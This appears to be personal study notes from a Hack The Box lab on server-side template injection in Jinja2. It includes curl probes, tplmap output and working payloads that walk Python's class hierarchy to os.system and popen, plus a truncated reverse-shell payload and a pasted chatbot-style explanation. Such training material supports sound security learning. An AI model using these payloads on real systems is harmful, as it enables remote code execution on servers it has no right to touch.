![image](https://academy.hackthebox.com/storage/modules/145/img/jinja1.png)

User input is submitted via the `cmd` parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`.

#### cURL - Interacting with the Target

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>{7*7}</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>

```

It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time.

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>${7*7}</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```

It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>49</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```

Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the `SSTI Identification`. We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds.

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>7777777</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.

We could have automated the template engine identification process we just executed through `tplmap`, as follows.

#### tplmap.py

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'

    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'cmd' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: cmd
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```

The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI.
## Python Primer for SSTI

Below is a small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:

|**No.**|**Methods**|**Description**|
|---|---|---|
|1.|`__class__`|Returns the object (class) to which the type belongs|
|2.|`__mro__`|Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.|
|3.|`__subclasses__`|Each new class retains references to subclasses, and this method returns a list of references that are still available in the class|
|4.|`__builtins__`|Returns the builtin methods included in a function|
|5.|`__globals__`|A reference to a dictionary that contains global variables for a function|
|6.|`__base__`|Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class)|
|7.|`__init__`|Class initialization method|
#### Python 3 Interpreter

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

Create a string object and use `type` and `__class__`, as follows. Then use the `dir()` command to show all methods and attributes from the object.

Code: python

```python
>>> import flask
>>> s = 'HTB'
>>> type(s)

<class 'str'>


>>> s.__class__

<class 'str'>


>>> dir(s)

['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```

The next step is to understand Python's hierarchy. Using `__mro__` or `mro()`, we can go back up the tree of inherited objects in the Python environment. Let's practice this as follows.

Code: python

```python
>>> s.__class__.__class__

<class 'type'>


>>> s.__class__.__base__

<class 'object'>


>>> s.__class__.__base__.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
 
 
>>> s.__class__.mro()[1].__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```

Now, let us look for useful classes that can facilitate remote code execution.

Code: python

```python
>>> x = s.__class__.mro()[1].__subclasses__()
>>> for i in range(len(x)):print(i, x[i].__name__)
...
0 type
1 weakref
2 weakcallableproxy
3 weakproxy
4 int
5 bytearray
6 bytes
7 list
8 NoneType
<SNIP>

>>> def searchfunc(name):
...     x = s.__class__.mro()[1].__subclasses__()
...     for i in range(len(x)):
...             fn = x[i].__name__
...             if fn.find(name) > -1:
...                     print(i, fn)
...
>>> searchfunc('warning')

215 catch_warnings
```

Why are we searching for `warning` you may ask. We chose this class because it imports Python's [sys module](https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3) , and from `sys`, the `os` module can be reached. More precisely, os modules are all from `warnings.catch_`.

Please note that you will probably come across a different number. Back to our Python for SSTI specifics, we have seen that `catch_warnings` is present without importing any additional module to our Python console. Let's enumerate the builtins from this class as follows.

```python
>>> y = x[215]
>>> y

<class 'warnings.catch_warnings'>


>>> y()._module.__builtins__

{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>,
 <SNIP>


>>> z = y()._module.__builtins__
>>> for i in z:
...     if i.find('import') >-1:
...             print(i, z[i])
...	
__import__ <built-in function __import__>
```

It seems we have reached the import function by walking the hierarchy. This means we can load `os` and use the `system` function to execute code all coming from a string object, as follows.

Code: python

```python
>>> ''.__class__.__mro__[1].__subclasses__()

[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
RCE from a string object
0
```

Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.

Payload:

Code: python

```python
{{ ''.__class__ }}
```

#### Curl - Interacting with the Target

  SSTI Exploitation Example 3

```shell-session
Pangulin@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>&lt;class &#39;str&#39;&gt;</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```


---------------------------------------------------------------
#Explanation: 


Sure! Let's break this down step by step. The code you provided explores the class hierarchy in Python using various class attributes and methods.

### 1. `s.__class__.__class__`

This line is asking for the class of the class of `s`.

- `s.__class__`: This gives the class of `s`. For example, if `s` is a string (`s = "hello"`), `s.__class__` would be `<class 'str'>`.
- `s.__class__.__class__`: This gives the class of the class of `s`, which is `<class 'type'>`, because in Python, classes themselves are instances of the `type` class.

### 2. `s.__class__.__base__`

This line asks for the base class (or superclass) of the class of `s`.

- `s.__class__.__base__`: This gives the base class of `s.__class__`. For most built-in types, the base class is `<class 'object'>`, because all new-style classes in Python inherit from `object`.

### 3. `s.__class__.__base__.__subclasses__()`

This line asks for all the subclasses of the base class of the class of `s`.

- `s.__class__.__base__`: As mentioned, this gives the base class, which is `<class 'object'>`.
- `s.__class__.__base__.__subclasses__()`: This method returns a list of all classes that directly inherit from `object`. The output is a long list of built-in Python types, such as `int`, `str`, `list`, `dict`, etc.

### 4. `s.__class__.mro()[1].__subclasses__()`

This line is a bit more complex. It involves the method resolution order (MRO) of the class of `s`.

- `s.__class__.mro()`: This method returns a list representing the method resolution order. The first element is the class itself, the second is its base class, and so on, up the inheritance chain.
- `s.__class__.mro()[1]`: This gets the second element in the MRO list, which is typically the base class of `s.__class__`.
- `s.__class__.mro()[1].__subclasses__()`: This then gets the subclasses of that base class, similar to the previous example.

In summary, these lines of code are navigating through the class hierarchy of `s` to find out information about its class, its base class, and the subclasses of the base class. This helps understand the inheritance structure and how classes are related in Python.

Let's break this down step by step, explaining each part clearly and simply.

### Step-by-Step Explanation

1. **Finding Subclasses**
    
    python
    
    Code kopieren
    
    `x = s.__class__.mro()[1].__subclasses__()`
    
    This line retrieves all subclasses of the base class of `s`. If `s` is a string, `s.__class__` is `<class 'str'>`, its base class is `<class 'object'>`, and this code gets all subclasses of `object`.
    
2. **Printing Subclasses**
    
    python
    
    Code kopieren
    
    `for i in range(len(x)):     print(i, x[i].__name__)`
    
    This loop iterates through the list of subclasses and prints their index and name.
    
    **Output Example:**
    
    python
    
    Code kopieren
    
    `0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType ...`
    
3. **Searching for a Specific Class**
    
    python
    
    Code kopieren
    
    `def searchfunc(name):     x = s.__class__.mro()[1].__subclasses__()     for i in range(len(x)):         fn = x[i].__name__         if fn.find(name) > -1:             print(i, fn)`
    
    This function searches for subclasses by name. If the name contains the search term, it prints the index and name.
    
    **Using the Function:**
    
    python
    
    Code kopieren
    
    `searchfunc('warning')`
    
    This searches for any subclass names containing "warning".
    
    **Output Example:**
    
    Code kopieren
    
    `215 catch_warnings`
    
4. **Accessing the `catch_warnings` Class**
    
    python
    
    Code kopieren
    
    `y = x[215] y`
    
    This assigns the `catch_warnings` class (found at index 215) to `y`.
    
    **Output:**
    
    python
    
    Code kopieren
    
    `<class 'warnings.catch_warnings'>`
    
5. **Exploring Builtins in `catch_warnings`**
    
    python
    
    Code kopieren
    
    `y()._module.__builtins__`
    
    This accesses the built-in objects from the `warnings.catch_warnings` class.
    
    **Output Example:**
    
    bash
    
    Code kopieren
    
    `{'__name__': 'builtins', ... '__import__': <built-in function __import__>, ...}`
    
6. **Finding the Import Function**
    
    python
    
    Code kopieren
    
    `z = y()._module.__builtins__ for i in z:     if i.find('import') > -1:         print(i, z[i])`
    
    This finds and prints the built-in `__import__` function.
    
    **Output:**
    
    python
    
    Code kopieren
    
    `__import__ <built-in function __import__>`
    

### Leveraging the Import Function for RCE (Remote Code Execution)

This is a more advanced and potentially dangerous step. It demonstrates how to dynamically import the `os` module and execute system commands from a string object.

1. **Using the Import Function**
    
    python
    
    Code kopieren
    
    `''.__class__.__mro__[1].__subclasses__()[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')`
    
    This one-liner does the following:
    
    - `''.__class__.__mro__[1].__subclasses__()`: Gets the subclasses of `object`.
    - `[215]`: Accesses the `catch_warnings` class.
    - `()._module.__builtins__['__import__']('os')`: Uses the `__import__` function to import the `os` module.
    - `.system('echo RCE from a string object')`: Executes the `echo` command using `os.system`.
    
    **Output:**
    
    csharp
    
    Code kopieren
    
    `RCE from a string object`
    

### Summary

- We explored Python's class hierarchy using `__class__`, `mro()`, and `__subclasses__()`.
- We created a function to search for specific subclasses by name.
- We found the `warnings.catch_warnings` class and accessed its built-in functions.
- We demonstrated how to use the `__import__` function to import the `os` module and execute system commands.

This showcases Python's flexibility and power, but also highlights the need to be cautious with such capabilities to avoid security risks like remote code execution (RCE).

The code provided is an example of a Server-Side Template Injection (SSTI) vulnerability exploitation. SSTI vulnerabilities occur when user input is incorrectly handled and rendered as part of a template, allowing attackers to inject and execute arbitrary code on the server.

In this example, the following steps outline the exploitation process:

1. **Vulnerability Identification**: The application is found to be vulnerable to SSTI. In the given example, the template engine allows execution of arbitrary Python code.
    
2. **Crafting the Payload**: The payload `{{ ''.__class__.__mro__[1].__subclasses__() }}` is crafted. This payload leverages Python's special methods and attributes to gain access to the list of all subclasses of the base object type.
    
    - `''.__class__`: Gets the class of an empty string, which is `str`.
    - `.__mro__`: The Method Resolution Order of the class, which is a tuple of classes that are considered during method lookup.
    - `[1]`: Selects the second class in the MRO tuple, which is `object`.
    - `.__subclasses__()`: Returns a list of all subclasses of `object`.
3. **Sending the Exploit**: The payload is sent to the server using a GET request, such as:
    
    sh
    
    Code kopieren
    
    `curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"`
    
4. **Extracting Information**: The server processes the template and renders the result, which includes a list of all subclasses of `object`. This list includes many internal Python classes, providing insight into the server's environment.
    
5. **Output Analysis**: The server’s response contains the list of subclasses, revealing classes such as `type`, `weakref`, `list`, `dict`, `tuple`, and many others. This information can be useful for further exploitation or understanding the server's configuration.
    

Here is a snippet of the server's response showing some of the subclasses:

html

Code kopieren

`<a>[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, ... ]</a>`

### SSTI Exploitation Example 3 Walkthrough

**Step 1: Enumerate Available Classes**

The initial step involves enumerating the available classes in the Python environment. This is done using the following payload, which will list subclasses:

shell

Code kopieren

`curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"`

**Response:**

html

Code kopieren

`0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType 9 NotImplementedType 10 traceback 11 super ... 214 catch_warnings ...`

The enumeration output shows `catch_warnings` located at index 214.

**Step 2: Construct RCE Payload**

Knowing the index of `catch_warnings`, we construct a payload to execute a system command. For example, creating a file in the `/tmp` directory.

python

Code kopieren

`{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}`

Encoded for the curl request:

shell

Code kopieren

`curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"`

**Response:**

html

Code kopieren

`0`

The response `0` indicates the command was executed without errors.

**Step 3: Verify Command Execution**

To confirm that the file `test1` was created, we can list the contents of the `/tmp` directory:

python

Code kopieren

`{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}`

Encoded for the curl request:

shell

Code kopieren

`curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"`

**Response:**

html

Code kopieren

`test1 tmpv4tucw2b`

The response confirms that `test1` was created in the `/tmp` directory.

### Using Specific Functions for SSTI Exploitation

**Using `request` Function:**

python

Code kopieren

`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

**Using `lipsum` Function:**

python

Code kopieren

`{{lipsum.__globals__.os.popen('id').read()}}`

### Establishing a Reverse Shell

To establish a reverse shell, you can use a payload such as:

python

Code kopieren

`{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("so...`

This payload is truncated and needs to be completed with a proper reverse shell code.